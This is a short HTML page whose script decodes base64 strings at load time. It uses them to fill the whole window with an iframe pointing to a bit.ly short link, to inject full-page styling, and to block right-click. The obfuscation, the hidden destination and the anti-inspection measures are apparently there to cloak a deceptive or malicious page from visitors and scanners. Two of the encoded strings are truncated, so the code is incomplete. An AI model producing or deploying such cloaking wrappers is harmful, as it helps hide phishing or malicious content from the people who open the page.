<!DOCTYPE html>

<body oncontextmenu="return false">
    <script>

        function decodeBase64(encoded) {
            return decodeURIComponent(atob(encoded).split('').map(function(c) {
                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
            }).join(''));
        }


        const styleContent = "Ym9keSwgaHRtbCB7bWFyZ2luOiAwO3BhZGRpbmc6IDA7aGVpZ2h0OiAxMDAlO29..."
        const style = document.createElement('style');
        style.innerHTML = decodeBase64(styleContent);
        document.head.appendChild(style);


        const iframeContent = "aHR0cHM6Ly9iaXQubHkvNGY1RDBLZw==";  //    
     const iframe = document.createElement('iframe');
        iframe.src = decodeBase64(iframeContent);
        iframe.allowFullscreen = true;
        document.body.appendChild(iframe);

    
        const scriptContent = "ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY29udGV4dG1lbnUnLCBlID0+IGUu..."
        const script = document.createElement('script');
        script.innerHTML = decodeBase64(scriptContent);
        document.body.appendChild(script);
    </script>
</body>
